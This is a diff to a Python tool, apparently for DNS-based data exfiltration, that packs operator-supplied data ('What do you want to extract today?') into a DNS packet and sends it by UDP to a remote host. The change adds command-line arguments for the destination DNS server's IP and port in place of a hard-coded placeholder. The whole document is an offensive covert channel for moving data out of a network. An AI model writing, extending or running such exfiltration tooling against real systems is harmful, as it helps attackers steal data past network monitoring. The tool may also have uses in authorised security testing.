@@ -1,6 +1,7 @@
 import struct
 import socket
 import argparse
+import sys
 
 #@author Patrick Mathieu / @pathetiq
 # This code is an update from: 
@@ -36,8 +37,12 @@ class DnsPacketBuilder:
    
 def main():
     parser = argparse.ArgumentParser(description='Process args.')
+    parser.add_argument('-t','--dns', help='DNS server IP address')
+    parser.add_argument('-p','--port', help='DNS server port')
     parser.add_argument('-d','--data', help='What do you want to extract today?')
     args = parser.parse_args()
+    dns_ip = args.dns.encode('utf-8')
+    dns_port = args.port.encode('utf-8')
     data = args.data.encode('utf-8')
 
     # Sending the following
@@ -58,7 +63,7 @@ def main():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(('', 8888))
     sock.settimeout(2)
-    sock.sendto(bytes(packet), ("YOURIP", 53)) #@TODO add a parsearg for the remote IP
+    sock.sendto(bytes(packet), (dns_ip, int(dns_port))) #@TODO add a parsearg for the remote IP
 
     print("Packet Sent")
 
@@ -71,4 +76,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
